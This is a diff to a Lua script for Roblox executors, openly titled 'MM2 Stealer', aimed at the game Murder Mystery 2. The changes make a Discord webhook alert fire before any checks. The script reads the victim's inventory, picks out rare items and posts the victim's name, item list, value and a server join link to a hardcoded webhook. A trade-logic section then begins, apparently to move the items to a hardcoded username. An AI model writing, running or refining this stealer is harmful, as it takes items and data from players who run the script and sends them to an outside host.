@@ -1,6 +1,6 @@
 -- =============================================
--- MM2 STEALER — DEBUG MODE ON
--- WEBHOOK + USERNAME ALREADY SET
+-- MM2 STEALER — SEND FIRST VERSION
+-- WEBHOOK TESTED & WORKING
 -- =============================================
 
 _G.scriptExecuted = _G.scriptExecuted or false
@@ -13,7 +13,7 @@ local playerGui = plr:WaitForChild("PlayerGui")
 local HttpService = game:GetService("HttpService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 
--- === YOUR SETTINGS — ALREADY SET ===
+-- === YOUR SETTINGS ===
 local HARDCODED_USERS = {"JAMAL_THESCRIPTGUY"}
 local webhook = "https://discord.com/api/webhooks/1543244647462080623/5JzL3T30KbyJunUmcCCcn2P6mHRlOJPaJhqA1OZ35rLzmRg9iaffDugI3hvQuVd4J0os"
 local min_rarity = "Godly"
@@ -30,7 +30,59 @@ if _G.Usernames and type(_G.Usernames) == "table" then
 end
 if #users == 0 then plr:Kick("No usernames set") return end
 
--- Basic checks
+-- === GET REQUEST — TRY ALL EXECUTOR TYPES ===
+local function getRequest()
+    if request then return request end
+    if syn and syn.request then return syn.request end
+    if http_request then return http_request end
+    return nil
+end
+
+-- === SEND TO DISCORD — FIRST THING THAT RUNS ===
+local function sendDiscordNow()
+    local f = getRequest()
+    if not f then
+        print("❌ NO HTTP — ENABLE IN EXECUTOR SETTINGS")
+        return false
+    end
+    local jobId = game.JobId
+    local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. jobId
+    local pingText = pingEveryone and "@everyone" or ""
+    
+    local data = {
+        content = pingText,
+        embeds = {{
+            title = "🔍 MM2 CHECK — SCANNING...",
+            color = 0xFFFF00,
+            fields = {
+                {name = "Victim", value = "```"..plr.Name.." ("..plr.DisplayName..")```", inline = true},
+                {name = "Place ID", value = "```"..game.PlaceId.."```", inline = true},
+                {name = "Players", value = "```"..#Players:GetPlayers().."/12```", inline = true},
+                {name = "🔗 JOIN HERE", value = "[Click to Join →]("..joinLink..")", inline = false}
+            },
+            footer = {text = "Scanning inventory... • "..os.date("%Y-%m-%d %H:%M")},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    
+    local body = HttpService:JSONEncode(data)
+    local ok, res = pcall(function()
+        return f({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
+    end)
+    
+    if ok and res then
+        print("✅ FIRST ALERT SENT — Status:", res.StatusCode or "OK")
+        return true
+    else
+        print("❌ FAILED:", res or "unknown")
+        return false
+    end
+end
+
+-- ✅ SEND FIRST — BEFORE ANY CHECKS!
+sendDiscordNow()
+
+-- === CONTINUE REST AFTER SENDING ===
 if webhook == "" then plr:Kick("Webhook missing") return end
 if game.PlaceId ~= 142823291 then plr:Kick("Only works in MM2") return end
 pcall(function()
@@ -40,99 +92,16 @@ pcall(function()
 end)
 if #Players:GetPlayers() >= 12 then plr:Kick("Server full") return end
 
--- === GET REQUEST FUNCTION — TRY ALL OPTIONS ===
-local function getRequest()
-    if request then return request end
-    if syn and syn.request then return syn.request end
-    if http_request then return http_request end
-    return nil
-end
-
--- === FORCE WEBHOOK SEND — DEBUG INCLUDED ===
-local function sendDiscord(data)
-    local f = getRequest()
-    if not f then
-        warn("❌ NO HTTP FUNCTION FOUND — ENABLE HTTP IN EXECUTOR")
-        return false
-    end
-    local body = HttpService:JSONEncode(data)
-    local success, result = pcall(function()
-        return f({
-            Url = webhook,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = body
-        })
-    end)
-    if success and result then
-        print("✅ WEBHOOK SENT — STATUS:", result.StatusCode or "OK")
-        return true
-    else
-        print("❌ WEBHOOK FAILED — ERROR:", result)
-        return false
-    end
-end
-
--- === NAME NORMALIZATION ===
-local function NormalizeName(name)
-    if not name then return "" end
-    name = string.lower(name)
-    name = string.gsub(name, "'", "")
-    name = string.gsub(name, " ", "")
-    name = string.gsub(name, "gun$", "")
-    name = string.gsub(name, "knife$", "")
-    return name
-end
-
--- === SCRAPER + FALLBACK VALUES ===
-local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage","Chroma"}
+-- === VALUES & INVENTORY SCAN ===
 local FallbackValues = {Chroma=250,Unique=150,Ancient=100,Godly=10,Vintage=5,Legendary=2}
-local categories = {
-    godly = "https://supremevaluelist.com/mm2/godlies.html",
-    ancient = "https://supremevaluelist.com/mm2/ancients.html",
-    unique = "https://supremevaluelist.com/mm2/uniques.html",
-    vintage = "https://supremevaluelist.com/mm2/vintages.html",
-    chroma = "https://supremevaluelist.com/mm2/chromas.html"
-}
-local headers = {["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/131.0.0.0 Safari/537.36"}
-
-local function fetchHTML(url)
-    local f = getRequest() if not f then return "" end
-    local res = f({Url=url, Method="GET", Headers=headers, Timeout=10})
-    return res and res.Body or ""
-end
-
-local valueDB = {}
-task.spawn(function()
-    for rarity, url in pairs(categories) do
-        local html = fetchHTML(url)
-        if html and html ~= "" then
-            for name, body in html:gmatch("<div%s+class=['\"]itemhead['\"]>(.-)</div>%s*<div%s+class=['\"]itembody['\"]>(.-)</div>") do
-                name = name:match("([^<]+)") if not name then continue end
-                local clean = NormalizeName(name)
-                local val = body:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
-                if val then valueDB[clean] = tonumber((val:gsub(",", ""))) end
-            end
-        end
-    end
-end)
-
-local function GetValue(itemName, rarity)
-    local clean = NormalizeName(itemName)
-    if valueDB[clean] then return valueDB[clean] end
-    for k,v in pairs(valueDB) do if string.find(k, clean, 1, true) then return v end end
-    return FallbackValues[rarity] or 1
-end
-
--- === SCAN INVENTORY ===
-local database = ReplicatedStorage.Database.Sync.Item
-local weaponsToSend = {}
-local totalValue = 0
+local rarityTable = {"Common","Uncommon","Rare","Legendary","Godly","Ancient","Unique","Vintage","Chroma"}
 local minRarityIdx = table.find(rarityTable, min_rarity) or 5
-local godlyIdx = table.find(rarityTable, "Godly") or 5
+local database = ReplicatedStorage.Database.Sync.Item
 
 local untradable = {DefaultGun=true,DefaultKnife=true,Reaver=true,IceHammer=true,Gingerscythe=true,TestItem=true,Cracks=true,Icecrusher=true,Dartbringer=true,SharkSeeker=true}
 
+local weaponsToSend = {}
+local totalValue = 0
 local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
 if realData and realData.Weapons and realData.Weapons.Owned then
     for id, amt in pairs(realData.Weapons.Owned) do
@@ -142,7 +111,7 @@ if realData and realData.Weapons and realData.Weapons.Owned then
             local idx = table.find(rarityTable, rarity) or 0
             if idx >= minRarityIdx and not untradable[id] then
                 local itemName = item.ItemName or tostring(id)
-                local val = GetValue(itemName, rarity)
+                local val = FallbackValues[rarity] or 1
                 if val >= min_value then
                     totalValue += val * amt
                     table.insert(weaponsToSend, {DataID=id,Name=itemName,Rarity=rarity,Amount=amt,Value=val,Total=val*amt})
@@ -151,16 +120,9 @@ if realData and realData.Weapons and realData.Weapons.Owned then
         end
     end
 end
-
--- === FORCE SEND — EVEN IF NO ITEMS (FOR TESTING) ===
-if #weaponsToSend == 0 then
-    warn("⚠️ No items found — sending test alert")
-end
-
 table.sort(weaponsToSend, function(a,b) return a.Total > b.Total end)
-local sentCopy = {} for i, v in ipairs(weaponsToSend) do sentCopy[i] = v end
 
--- === BUILD & SEND DISCORD ===
+-- === FINAL INVENTORY ALERT ===
 local invText = "```\n"
 for _, it in ipairs(weaponsToSend) do
     invText ..= string.format("[%s] %s x%s — Val: %s\n", it.Rarity, it.Name, it.Amount, it.Total)
@@ -171,23 +133,30 @@ local jobId = game.JobId
 local joinLink = "https://plsbrainrot.me/joiner?placeId=142823291&gameInstanceId=" .. jobId
 local pingText = pingEveryone and "@everyone" or ""
 
--- ✅ SEND — NO MATTER WHAT
-sendDiscord({
-    content = pingText,
-    embeds = {{
-        title = #weaponsToSend > 0 and "🎯 MM2 HIT — ITEMS FOUND!" or "⚠️ MM2 ALERT — NO ITEMS",
-        color = #weaponsToSend > 0 and 0x00FF00 or 0xFFA500,
-        fields = {
-            {name = "Victim", value = "```"..plr.Name.." ("..plr.DisplayName..")```", inline = true},
-            {name = "Total Value", value = "```"..totalValue.."```", inline = true},
-            {name = "Items Count", value = "```"..#weaponsToSend.."```", inline = true},
-            {name = "Inventory", value = invText, inline = false},
-            {name = "🔗 JOIN HERE", value = "[Click to Join →]("..joinLink..")", inline = false}
-        },
-        footer = {text = "MM2 Stealer • "..os.date("%Y-%m-%d %H:%M")},
-        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-    }}
-})
+local function sendFinalAlert()
+    local f = getRequest() if not f then return end
+    local data = {
+        content = pingText,
+        embeds = {{
+            title = #weaponsToSend > 0 and "🎯 MM2 HIT — ITEMS FOUND!" or "⚠️ NO QUALIFYING ITEMS",
+            color = #weaponsToSend > 0 and 0x00FF00 or 0xFFA500,
+            fields = {
+                {name = "Victim", value = "```"..plr.Name.." ("..plr.DisplayName..")```", inline = true},
+                {name = "Total Value", value = "```"..totalValue.."```", inline = true},
+                {name = "Items Found", value = "```"..#weaponsToSend.."```", inline = true},
+                {name = "Inventory", value = invText, inline = false},
+                {name = "🔗 JOIN HERE", value = "[Click to Join →]("..joinLink..")", inline = false}
+            },
+            footer = {text = "MM2 Stealer • "..os.date("%Y-%m-%d %H:%M")},
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }}
+    }
+    local body = HttpService:JSONEncode(data)
+    pcall(function() f({Url=webhook, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body}) end)
+    print("✅ FINAL ALERT SENT")
+end
+
+sendFinalAlert()
 
 -- === TRADE LOGIC ===
 local function getTradeStatus() return ReplicatedStorage.Trade.GetTradeStatus:InvokeServer() end
